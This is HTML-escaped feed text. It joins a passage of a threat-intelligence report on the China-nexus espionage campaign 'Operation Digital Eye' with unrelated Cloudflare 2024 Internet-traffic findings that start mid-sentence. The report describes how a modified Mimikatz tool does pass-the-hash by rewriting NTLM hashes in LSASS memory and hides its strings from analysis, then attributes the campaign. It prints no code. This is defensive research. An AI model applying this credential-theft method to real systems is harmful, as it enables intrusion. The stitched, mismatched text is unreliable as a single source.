&lt;li&gt;&lt;code&gt;/c&lt;/code&gt;: The process to execute; defaults to &lt;code&gt;cmd.exe&lt;/code&gt; if not provided.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/u&lt;/code&gt;: The user’s username.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/d&lt;/code&gt;: The user’s domain.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/h&lt;/code&gt;: The NTLM password hash.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;bK2o.exe&lt;/code&gt; implements a pass-the-hash technique by overwriting LSASS memory in a manner similar to Mimikatz, with its implementation partially overlapping with Mimikatz functions such as &lt;code&gt;kuhl_m_sekurlsa_pth_luid&lt;/code&gt; and &lt;code&gt;kuhl_m_sekurlsa_msv_enum_cred_callback_pth&lt;/code&gt;. In summary, &lt;code&gt;bK2o.exe&lt;/code&gt; performs the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw" rel="noopener noreferrer" target="_blank"&gt;Creates&lt;/a&gt; a suspended process in a new logon session, specifying the attacker-provided process, username, domain, and an empty password.&lt;/li&gt;
&lt;li&gt;Based on the session’s locally unique identifier (LUID), locates and extracts from the LSASS process memory an encrypted credential data blob containing the user’s NTLM hash and the encryption keys required to decrypt the blob.&lt;/li&gt;
&lt;li&gt;Decrypts the data blob, overwrites the user’s NTLM hash with the attacker-provided hash, and re-encrypts the data blob.&lt;/li&gt;
&lt;li&gt;Resumes the suspended process.&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109535" style="width: 749px;"&gt;&lt;img alt="bK2o.exe creates a new process and retrieves the logon session’s LUID" class="size-full wp-image-109535" height="527" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye8.jpg" width="749" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109535"&gt;bK2o.exe creates a new process and retrieves the logon session’s LUID&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;To navigate LSASS memory, &lt;code&gt;bK2o.exe&lt;/code&gt; uses code signatures, represented as byte sequences in hexadecimal format. These sequences correspond to known LSASS instructions, which serve as navigation points within the memory.&lt;/p&gt;
&lt;p&gt;To hinder static analysis and evade detection, &lt;code&gt;bK2o.exe&lt;/code&gt; obfuscates code signatures and strings by constructing them dynamically on the stack at runtime, instead of storing them as static data.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109542" style="width: 382px;"&gt;&lt;img alt="bK2o.exe constructs the string lsasrv.dll on the stack" class="size-full wp-image-109542" height="181" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye17.jpg" width="382" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109542"&gt;bK2o.exe constructs the string lsasrv.dll on the stack&lt;/figcaption&gt;&lt;/figure&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109538" style="width: 314px;"&gt;&lt;img alt="bK2o.exe constructs the code signature 33 ff 41 89 37 4c 8b f3 [...] on the stack" class="size-full wp-image-109538" height="121" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye5.jpg" width="314" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109538"&gt;bK2o.exe constructs the code signature 33 ff 41 89 37 4c 8b f3 [&amp;#8230;] on the stack&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;From Operation Digital Eye to Tainted Love and Soft Cell&lt;/h2&gt;
&lt;p&gt;We identified two additional samples uploaded to malware sharing platforms that construct code signatures on the stack, which we refer to as &lt;code&gt;&lt;code&gt;wsx1.exe&lt;/code&gt;&lt;/code&gt; and &lt;code&gt;wsx1.exe&lt;/code&gt;. Like &lt;code&gt;bK2o.exe&lt;/code&gt;, both &lt;code&gt;wsx.exe&lt;/code&gt; and &lt;code&gt;wsx1.exe&lt;/code&gt; are custom modified versions of Mimikatz and implement pass-the-hash functionality.&lt;/p&gt;
&lt;p&gt;Substantial code segments in &lt;code&gt;wsx.exe&lt;/code&gt; and &lt;code&gt;wsx1.exe&lt;/code&gt;, which implement the construction of code signatures on the stack, overlap with those in &lt;code&gt;bK2o.exe&lt;/code&gt;, including identical &lt;code&gt;mov&lt;/code&gt; instruction operand sizes and values. This suggests that &lt;code&gt;wsx.exe&lt;/code&gt;, &lt;code&gt;wsx1.exe&lt;/code&gt;, and &lt;code&gt;bK2o.exe&lt;/code&gt; are highly likely derived from the same source.&lt;/p&gt;
&lt;p&gt;&lt;figure class="wp-caption aligncenter" id="attachment_109549" style="width: 442px;"&gt;&lt;img alt="Code segment in bK2o.exe" class="size-full wp-image-109549" height="542" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye10.jpg" width="442" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109549"&gt;Code segment in bK2o.exe&lt;/figcaption&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109550" style="width: 473px;"&gt;&lt;img alt="Code segment in wsx1.exe" class="size-full wp-image-109550" height="562" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye1.jpg" width="473" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109550"&gt;Code segment in wsx1.exe&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In turn, we observed overlaps between &lt;code&gt;wsx.exe&lt;/code&gt;, &lt;code&gt;wsx1.exe&lt;/code&gt;, and mim221 components. mim221 is a versioned and well-maintained credential theft tool, also a custom modified version of Mimikatz, which SentinelLabs observed in &lt;a href="https://www.sentinelone.com/labs/operation-tainted-love-chinese-apts-target-telcos-in-new-attacks/" rel="noopener noreferrer" target="_blank"&gt;Operation Tainted Love&lt;/a&gt; — a campaign targeting telecommunication providers in the Middle East in 2023.&lt;/p&gt;
&lt;p&gt;We attributed Operation Tainted Love to a suspected Chinese cyberespionage group within the nexus of Granite Typhoon (formerly known as Gallium) and APT41, while acknowledging the possibility of tool sharing among Chinese state-sponsored threat actors and the potential involvement of a shared vendor or digital quartermaster. We assess that mim221 represents an evolution of tooling &lt;a href="https://www.cybereason.com/blog/research/deadringer-exposing-chinese-threat-actors-targeting-major-telcos" rel="noopener noreferrer" target="_blank"&gt;associated&lt;/a&gt; with &lt;a href="https://www.cybereason.com/blog/research/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers" rel="noopener noreferrer" target="_blank"&gt;Operation Soft Cell&lt;/a&gt;, such as &lt;a href="https://www.virustotal.com/gui/file/65ea5f7750f44d98f1077397b906b2611781579a2ae6def44a4de5b41265a9b9/details" rel="noopener noreferrer" target="_blank"&gt;simplify_32.exe&lt;/a&gt;. Operation Soft Cell, which targeted telecommunication providers in 2017 and 2018, has been &lt;a href="https://www.bleepingcomputer.com/news/security/microsoft-warns-of-gallium-threat-group-attacking-global-telcos/" rel="noopener noreferrer" target="_blank"&gt;linked&lt;/a&gt; to Granite Typhoon, and possible &lt;a href="https://github.com/yt0ng/cracking_softcell/blob/main/Cracking_SOFTCLL_TLP_WHITE.pdf" rel="noopener noreferrer" target="_blank"&gt;connections&lt;/a&gt; between the Soft Cell actors and APT41 have also been suggested.&lt;/p&gt;
&lt;p&gt;mim221 has a multi-component architecture, with a single executable staging three components — &lt;code&gt;pc.dll&lt;/code&gt;, &lt;code&gt;AddSecurityPackage64.dll&lt;/code&gt;, and &lt;code&gt;getHashFlsa64.dll&lt;/code&gt; — using techniques such as decryption, injection, and reflective image loading. These components share several overlaps with &lt;code&gt;bK2o.exe&lt;/code&gt;, &lt;code&gt;wsx.exe&lt;/code&gt;, and &lt;code&gt;wsx1.exe&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;To hinder static analysis, some mim221 components also obfuscate strings by constructing them on the stack at runtime. Additionally, the mim221 components &lt;code&gt;AddSecurityPackage64.dll&lt;/code&gt; and &lt;code&gt;getHashFlsa64.dll&lt;/code&gt; implement error logging similar to that of &lt;code&gt;wsx.exe&lt;/code&gt; and &lt;code&gt;wsx1.exe&lt;/code&gt;, including identical custom error messages, a consistent output format, and the same English-language errors.&lt;/p&gt;
&lt;p&gt;&lt;figure class="wp-caption aligncenter" id="attachment_109534" style="width: 311px;"&gt;&lt;img alt="Error messages in mim221" class="size-full wp-image-109534" height="110" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye9.jpg" width="311" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109534"&gt;Error messages in mim221&lt;/figcaption&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109544" style="width: 331px;"&gt;&lt;img alt="Error messages in wsx.exe and wsx1.exe" class="size-full wp-image-109544" height="109" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye15.jpg" width="331" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109544"&gt;Error messages in wsx.exe and wsx1.exe&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;In addition, RTTI (Run-Time Type Information) information stored in &lt;code&gt;wsx.exe&lt;/code&gt;, &lt;code&gt;wsx1.exe&lt;/code&gt;, and the mim221 component &lt;code&gt;getHashFlsa64.dll&lt;/code&gt; reveals that classes with the same names are declared across these executables. We have not observed these class names in open-source or publicly available tooling.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109537" style="width: 1999px;"&gt;&lt;img alt="Class names (those present in more than one executable are highlighted in bold)" class="size-full wp-image-109537" height="1621" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye6.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109537"&gt;Class names (those present in more than one executable are highlighted in bold)&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;mimCN | A Collection of China-Nexus APT Tools&lt;/h2&gt;
&lt;p&gt;Due to the previously discussed overlaps between &lt;code&gt;bK2o.exe&lt;/code&gt; (used in Operation Digital Eye), &lt;code&gt;wsx.exe&lt;/code&gt;, &lt;code&gt;wsx1.exe&lt;/code&gt;, mim221 components (used in Operation Tainted Love), and &lt;code&gt;simplify_32.exe&lt;/code&gt; (used in Operation Soft Cell), we collectively refer to this collection of tools as mimCN.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109543" style="width: 1999px;"&gt;&lt;img alt="The mimCN samples bK2o.exe, wsx.exe, wsx1.exe, and mim221" class="size-full wp-image-109543" height="895" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye16.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109543"&gt;The mimCN samples bK2o.exe, wsx.exe, wsx1.exe, and mim221&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;We include in the mimCN tool collection not only the previously mentioned tools but also any other custom modifications of Mimikatz that have overlaps with other mimCN executables, suggesting they may originate from the same source. Such overlaps include shared code-signing certificates and the use of unique custom error messages or obfuscation techniques.&lt;/p&gt;
&lt;p&gt;To date, we have observed mimCN tools exclusively in the context of suspected Chinese APT activities. Although the compilation timestamps of the mimCN samples observed in these intrusions could have been manipulated, the proximity of the timestamps to when the activities occurred suggests that they are likely authentic.&lt;/p&gt;

&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109547" style="width: 1999px;"&gt;&lt;img alt="Use of mimCN samples" class="size-full wp-image-109547" height="668" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye12.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109547"&gt;Use of mimCN samples&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;Further, unique usage instructions found in some mimCN samples, such as &lt;code&gt;[ERROR]Please input command. eg, /cmd:xxx&lt;/code&gt;  and &lt;code&gt;[ERROR]Please input ip. eg, /ip:xx.XXX.xx.x or /ip:xxx.com&lt;/code&gt;, suggest the involvement of a dedicated development team that is leaving instructions for a separate group of operators. Combined with the presence of overlapping mimCN samples across various intrusions attributed to China-nexus APT groups and distributed over years, this suggests that mimCN is likely the product of an entity responsible for maintaining and provisioning tools to multiple clusters within the Chinese APT ecosystem.&lt;/p&gt;
&lt;h2&gt;Attribution Analysis&lt;/h2&gt;
&lt;p&gt;We assess that Operation Digital Eye was highly likely conducted by a China-nexus cluster with cyberespionage motivations. The specific group responsible remains unclear due to the extensive sharing of malware, operational playbooks, and infrastructure management processes among Chinese APT clusters. Our assessment is based on a collective consideration of multiple indicators, including the malware, infrastructure, and techniques used, victimology, and the timing of the activities.&lt;/p&gt;
&lt;h3&gt;Malware&lt;/h3&gt;
&lt;p&gt;A variant of the PHPsert webshell contains code comments in simplified Chinese. This suggests the potential involvement of Chinese-speaking developers. Further, the custom Mimikatz modification &lt;code&gt;bK2o.exe&lt;/code&gt; used in Operation Digital Eye is part of the mimCN collection and shares implementation overlaps with other custom Mimikatz modifications, suggesting a common origin. These tools have been observed exclusively in the context of suspected Chinese APT activities, such as &lt;a href="https://www.cybereason.com/blog/research/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers" rel="noopener noreferrer" target="_blank"&gt;Operation Soft Cell&lt;/a&gt; and &lt;a href="https://www.sentinelone.com/labs/operation-tainted-love-chinese-apts-target-telcos-in-new-attacks/" rel="noopener noreferrer" target="_blank"&gt;Operation Tainted Love&lt;/a&gt;. Malware and tooling used in these operations have been associated with the suspected Chinese APT groups Granite Typhoon and APT41, and &lt;a href="https://github.com/yt0ng/cracking_softcell/blob/main/Cracking_SOFTCLL_TLP_WHITE.pdf" rel="noopener noreferrer" target="_blank"&gt;possible connections&lt;/a&gt; to other China-nexus groups, such as APT10 and Lucky Mouse have also been suggested.&lt;/p&gt;
&lt;p&gt;The mimCN tool collection suggests the presence of a shared vendor or digital quartermaster responsible for the sustained development and provisioning of tools to groups within the Chinese APT ecosystem. This function is &lt;a href="https://go.recordedfuture.com/hubfs/reports/cta-2023-1107.pdf" rel="noopener noreferrer" target="_blank"&gt;suspected&lt;/a&gt; to play a significant role in the Chinese threat landscape. The &lt;a href="https://www.sentinelone.com/labs/unmasking-i-soon-the-leak-that-revealed-chinas-cyber-operations/" rel="noopener noreferrer" target="_blank"&gt;I-Soon leak&lt;/a&gt;, which offers rare insight into China’s cyberespionage activities, provides supporting evidence for the existence of digital quartermasters within this landscape.&lt;/p&gt;
&lt;h3&gt;Infrastructure&lt;/h3&gt;
&lt;p&gt;While not exclusive to Chinese APT groups, the use of M247 infrastructure, as seen in Operation Digital Eye, has been common among them in recent years. One example is the &lt;a href="https://www.sentinelone.com/labs/sandman-apt-china-based-adversaries-embrace-lua/" rel="noopener noreferrer" target="_blank"&gt;M247 infrastructure attributed&lt;/a&gt; to the suspected Chinese cluster STORM-0866 (also known as Red Dev 40), with which the &lt;a href="https://www.sentinelone.com/labs/sandman-apt-a-mystery-group-targeting-telcos-with-a-luajit-toolkit/" rel="noopener noreferrer" target="_blank"&gt;Sandman APT group&lt;/a&gt; is associated.&lt;/p&gt;
&lt;p&gt;Additionally, the use of Cloud services and resources located in geographic proximity to the targeted organizations in Operation Digital Eye suggests a carefully planned and targeted infrastructure management approach. In this context, we suspect the potential involvement of third-party entities tasked with administering and provisioning infrastructure, a practice that has become &lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks/" rel="noopener noreferrer" target="_blank"&gt;increasingly common&lt;/a&gt; in the Chinese APT ecosystem in recent years.&lt;/p&gt;
&lt;h3&gt;Abuse of Visual Studio Code&lt;/h3&gt;
&lt;p&gt;Our visibility into threat actor activities suggests that the abuse of Visual Studio Code tunneling for C2 purposes was relatively rare in the wild before Operation Digital Eye.&lt;/p&gt;
&lt;p&gt;Previous &lt;a href="https://venturebeat.com/security/crowdstrike-2024-report-exposes-north-koreas-covert-workforce-in-u-s-tech-firms/" rel="noopener noreferrer" target="_blank"&gt;research&lt;/a&gt; indicates that, starting in 2023, a suspected North Korean group has used Visual Studio Remote Tunnels to maintain persistence in compromised networks. Additionally, in October 2024, Cyble released a &lt;a href="https://cyble.com/blog/silent-intrusion-unraveling-the-sophisticated-attack-leveraging-vs-code-for-unauthorized-access/" rel="noopener noreferrer" target="_blank"&gt;report&lt;/a&gt; documenting unattributed activity in which threat actors distributed a &lt;a href="https://www.sentinelone.com/labs/who-needs-macros-threat-actors-pivot-to-abusing-explorer-and-other-lolbins-via-windows-shortcuts/" rel="noopener noreferrer" target="_blank"&gt;Windows Shortcut&lt;/a&gt; (LNK) file to deploy Visual Studio Code and activate its tunneling feature to establish remote access.&lt;/p&gt;
&lt;p&gt;As of this writing, the only publicly disclosed use of this technique around the time of Operation Digital Eye has been attributed to a suspected Chinese APT group. In September 2024, Unit 42 published a &lt;a href="https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/" rel="noopener noreferrer" target="_blank"&gt;report&lt;/a&gt; on a campaign targeting government entities in Southeast Asia, in which threat actors used Visual Studio Code as a backdoor. The campaign was attributed to Stately Taurus (also known as Mustang Panda). The exact timeline of the campaign is unclear, with mid-August 2024 being the only reference point explicitly mentioned in the Unit 42 report. Based on this, we suspect that Operation Digital Eye occurred prior to this activity.&lt;/p&gt;
&lt;p&gt;We did not observe any overlaps in TTPs between Operation Digital Eye and the activity reported by Unit 42, except for the abuse of Visual Studio Code. We recognize the possibility that distinct Chinese APT clusters may share operational playbooks that include leveraging Visual Studio Code for C2 purposes.&lt;/p&gt;
&lt;h3&gt;Temporal Analysis&lt;/h3&gt;
&lt;p&gt;Our analysis of timestamps marking the dates and times of operator activity in the targeted organizations showed that all activities occurred on workdays (Monday to Friday). Additionally, converting the timestamps from their original time zones, Coordinated Universal Time (UTC) and Central European Summer Time (CEST, UTC+2), to China Standard Time (CST, UTC+8) revealed that the operators were primarily active during typical working hours in China, mostly between 9 a.m. and 9 p.m. CST.&lt;/p&gt;
&lt;p&gt;This suggests a potentially state-sanctioned operation. The &amp;#8216;996&amp;#8217; work schedule (9 a.m. to 9 p.m. CST, six days a week) has been common in China’s technology sector, but it was &lt;a href="https://www.reuters.com/world/china/chinese-authorities-say-overtime-996-policy-is-illegal-2021-08-27/" rel="noopener noreferrer" target="_blank"&gt;ruled illegal&lt;/a&gt; by the Supreme People&amp;#8217;s Court in 2021. As a result, state employees are almost certainly restricted to weekday work, typically between 9 a.m. and 9 p.m., aligning closely with our observations from the timestamp analysis.&lt;/p&gt;
&lt;p&gt;The figure below shows the total number of connections established by the threat actors to Visual Studio Code tunnels throughout Operation Digital Eye, broken down by hour of the day. The data is presented in both the original time zone (CEST) and in China Standard Time (CST, CEST+6). We observed minimal to no activity between 10 p.m. and 9 a.m. CST, as well as between 11 a.m. and 1 p.m. CST, which aligns with the typical daily working hours in China, including the midday lunch break.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_109536" style="width: 1999px;"&gt;&lt;img alt="Number of established connections to Visual Studio Code tunnels" class="size-full wp-image-109536" height="704" src="https://www.sentinelone.com/wp-content/uploads/2024/11/Op_Digital_Eye7.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-109536"&gt;Number of established connections to Visual Studio Code tunnels&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Conclusions&lt;/h2&gt;
&lt;p&gt;Operation Digital Eye highlights the persistent threat posed by Chinese cyberespionage groups to European entities, with these threat actors continuing to focus on high-value targets. The campaign underscores the strategic nature of this threat, as breaching organizations that provide data, infrastructure, and cybersecurity solutions to other industries gives the attackers a foothold in the digital supply chain, enabling them to extend their reach to downstream entities.&lt;/p&gt;
&lt;p&gt;The abuse of Visual Studio Code Remote Tunnels in this campaign illustrates how Chinese APT groups often rely on practical, solution-oriented approaches to evade detection. By leveraging a trusted development tool and infrastructure, the threat actors aimed to disguise their malicious activities as legitimate. The exploitation of widely used technologies, which security teams may not scrutinize closely, presents a growing challenge for organizations. For defenders, this calls for a reevaluation of traditional security approaches and the implementation of robust detection mechanisms to identify such evasive techniques in real time.&lt;/p&gt;
&lt;p&gt;Lateral movement capabilities observed in Operation Digital Eye, linked to custom Mimikatz modifications used in previous campaigns, indicate the potential involvement of shared vendors or digital quartermasters and the important function they serve in the Chinese APT ecosystem. These centralized entities provide continuity and adaptability to cyberespionage operations, equipping threat actors with consistently updated tools and evolving tactics as they target new victims.&lt;/p&gt;

In this year’s review, we have added several new traffic, adoption, connectivity, and email security metrics, as well as the ability to do year-over-year and geographic comparisons for selected metrics. &lt;/p&gt;&lt;p&gt;Below, we present a summary of key findings, and then explore them in more detail in subsequent sections.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Key Findings&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#key-findings"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          
          &lt;div&gt;
            &lt;h3&gt;Traffic&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#traffic"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;ul&gt;&lt;li&gt;&lt;p&gt;Global Internet traffic grew 17.2% in 2024. &lt;a href="https://blog.cloudflare.com/tag/security/rss#global-internet-traffic-grew-17-2-in-2024"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Google maintained its position as the most popular Internet service overall. OpenAI remained at the top of the Generative AI category. Binance remained at the top of the Cryptocurrency category. WhatsApp remained the top Messaging platform, and Facebook remained the top Social Media site. &lt;a href="https://blog.cloudflare.com/tag/security/rss#google-maintained-its-position-as-the-most-popular-internet-service-openai-binance-whatsapp-and-facebook-led-their-respective-categories"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Global traffic from Starlink grew 3.3x in 2024, in line with last year’s growth rate. After initiating service in Malawi in July 2023, Starlink traffic from that country grew 38x in 2024. As Starlink added new markets, we saw traffic grow rapidly in those locations. &lt;a href="https://blog.cloudflare.com/tag/security/rss#global-traffic-from-starlink-grew-3-3x-in-2024-in-line-with-last-years-growth-rate-after-initiating-service-in-malawi-in-july-2023-starlink-traffic-from-that-country-grew-38x-in-2024"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Googlebot, Google’s web crawler, was responsible for the highest volume of request traffic to Cloudflare in 2024, as it retrieved content from millions of Cloudflare customer sites for search indexing. &lt;a href="https://blog.cloudflare.com/tag/security/rss#google-maintained-its-position-as-the-most-popular-internet-service-openai-binance-whatsapp-and-facebook-led-their-respective-categories"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Traffic from ByteDance’s AI crawler (Bytespider) gradually declined over the course of 2024. Anthropic’s AI crawler (ClaudeBot) first started showing signs of ongoing crawling activity in April, then declined after an initial peak in May &amp;amp; June. &lt;a href="https://blog.cloudflare.com/tag/security/rss#among-ai-bots-and-crawlers-bytespider-bytedance-traffic-gradually-declined-over-the-course-of-2024-while-claudebot-anthropic-was-more-active-during-the-back-half-of-the-year"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;13.0% of TLS 1.3 traffic is using post-quantum encryption. &lt;a href="https://blog.cloudflare.com/tag/security/rss#13-0-of-tls-1-3-traffic-is-using-post-quantum-encryption"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;div&gt;
            &lt;h3&gt;Adoption &amp;amp; Usage&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#adoption-usage"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;ul&gt;&lt;li&gt;&lt;p&gt;Globally, nearly one-third of mobile device traffic was from Apple iOS devices. Android had a &amp;gt;90% share of mobile device traffic in 29 countries/regions; peak iOS mobile device traffic share was over 60% in eight countries/regions. &lt;a href="https://blog.cloudflare.com/tag/security/rss#globally-nearly-one-third-of-mobile-device-traffic-was-from-apple-ios-devices-android-had-a-90-share-of-mobile-device-traffic-in-29-countries-regions-peak-ios-mobile-device-traffic-share-was-over-60-in-eight-countries-regions"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Globally, nearly half of web requests used HTTP/2, with 20.5% using HTTP/3. Usage of both versions was up slightly from 2023. &lt;a href="https://blog.cloudflare.com/tag/security/rss#globally-nearly-half-of-web-requests-used-http-2-with-20-5-using-http-3"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;React, PHP, and jQuery were among the most popular technologies used to build websites, while HubSpot, Google, and WordPress were among the most popular vendors of supporting services and platforms. &lt;a href="https://blog.cloudflare.com/tag/security/rss#react-php-and-jquery-were-among-the-most-popular-technologies-used-to-build-websites-while-hubspot-google-and-wordpress-were-among-the-most-popular-vendors-of-supporting-services-and-platforms"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Go surpassed NodeJS as the most popular language used for making automated API requests. &lt;a href="https://blog.cloudflare.com/tag/security/rss#go-surpassed-nodejs-as-the-most-popular-language-used-for-making-automated-api-requests"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Google is far and away the most popular search engine globally, across all platforms. On mobile devices and operating systems, Baidu is a distant second. Bing is a distant second across desktop and Windows devices, with DuckDuckGo second most popular on macOS. Shares vary by platform and country/region. &lt;a href="https://blog.cloudflare.com/tag/security/rss#google-is-the-most-popular-search-engine-globally-across-all-platforms-on-mobile-devices-os-baidu-is-a-distant-second-bing-is-a-distant-second-across-desktop-and-windows-devices-with-duckduckgo-second-most-popular-on-macos"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Google Chrome is far and away the most popular browser overall. While this is also true on macOS devices, Safari usage is well ahead of Chrome on iOS devices. On Windows, Edge is the second most popular browser as it comes preinstalled and is the initial default. &lt;a href="https://blog.cloudflare.com/tag/security/rss#google-chrome-is-the-most-popular-browser-overall-while-also-true-on-macos-devices-safari-usage-is-well-ahead-of-chrome-on-ios-devices-on-windows-edge-is-the-second-most-popular-browser"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;ul&gt;&lt;li&gt;&lt;p&gt;225 major Internet disruptions were observed globally in 2024, with many due to government-directed regional and national shutdowns of Internet connectivity. Cable cuts and power outages were also leading causes. &lt;a href="https://blog.cloudflare.com/tag/security/rss#225-major-internet-outages-were-observed-around-the-world-in-2024-with-many-due-to-government-directed-regional-and-national-shutdowns-of-internet-connectivity"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Aggregated across 2024, 28.5% of IPv6-capable requests were made over IPv6. India and Malaysia were the strongest countries, at 68.9% and 59.6% IPv6 adoption respectively. &lt;a href="https://blog.cloudflare.com/tag/security/rss#globally-nearly-half-of-web-requests-used-http-2-with-20-5-using-http-3"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;The top 10 countries ranked by Internet speed all had average download speeds above 200 Mbps. Spain was consistently among the top locations across the measured Internet quality metrics. &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-top-10-countries-ranked-by-internet-speed-all-had-average-download-speeds-above-200-mbps-spain-was-consistently-among-the-top-locations-across-measured-internet-quality-metrics"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;41.3% of global traffic comes from mobile devices. In nearly 100 countries/regions, the majority of traffic comes from mobile devices. &lt;a href="https://blog.cloudflare.com/tag/security/rss#41-3-of-global-traffic-comes-from-mobile-devices-in-nearly-100-countries-regions-the-majority-of-traffic-comes-from-mobile-devices"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;20.7% of TCP connections are unexpectedly terminated before any useful data can be exchanged. &lt;a href="https://blog.cloudflare.com/tag/security/rss#20-7-of-tcp-connections-are-unexpectedly-terminated-before-any-useful-data-can-be-exchanged"&gt;&lt;u&gt;🔗&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;

          &lt;/div&gt;
